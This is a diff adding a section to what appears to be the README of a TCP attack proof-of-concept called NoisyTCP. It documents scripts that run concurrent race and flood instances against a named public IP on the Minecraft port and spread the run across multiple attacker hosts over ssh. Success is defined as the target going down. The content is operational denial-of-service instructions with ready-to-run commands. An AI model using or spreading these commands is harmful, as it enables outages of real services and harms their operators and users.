@@ -390,3 +390,41 @@ sudo ./noisytcp --target 77.90.183.56 --port 25565 --probe
 
 Re-run the probe after the route change; `frag8=5/5` means the tunnel exit
 forwards fragments and the run can proceed.
+
+### 11.7 Campaign driver and fleet
+
+`lab/campaign.sh` wraps the binary: preflight probe, RST guard, N concurrent
+instances on disjoint source-port blocks, liveness monitor, timestamped log. It
+refuses to start if the probe says the path eats fragments, removes its iptables
+rule on exit, and exits `0` when the target stops answering.
+
+```sh
+sudo ./lab/campaign.sh --target 77.90.183.56 --port 25565
+
+sudo ./lab/campaign.sh --target 77.90.183.56 --port 25565 \
+  --instances 2 --race-threads 12 --race-pps 50000 \
+  --flood-threads 4 --flood-pps 30000 --pulse-ms 250 \
+  --duration 1800
+```
+
+Instance `i` gets `--base-sport 40000 + i*1024`, so keep `--tuples <= 1024` and
+`--instances <= 8`. The guard covers the whole span. Logs land in
+`lab/campaign-<ip>-<ts>.log`.
+
+`lab/fleet.sh` runs that driver on several attacker hosts in parallel:
+
+```sh
+cat > hosts.txt <<'HOSTS'
+user@10.0.0.11
+user@10.0.0.12
+HOSTS
+
+./lab/fleet.sh --target 77.90.183.56 --port 25565 --hosts hosts.txt \
+  --path '~/NoisyTCP-PoC' --extra "--instances 2 --pulse-ms 250"
+```
+
+Requirements: key-based ssh (`BatchMode=yes`), passwordless `sudo -n` on each
+host, and the repo already cloned there. Every host runs its own preflight, so a
+host whose uplink drops fragments aborts on its own and does not poison the run.
+Per-host output is written to `lab/fleet-<ts>/<host>.log`; the script exits `0`
+if at least one host reported the target down.
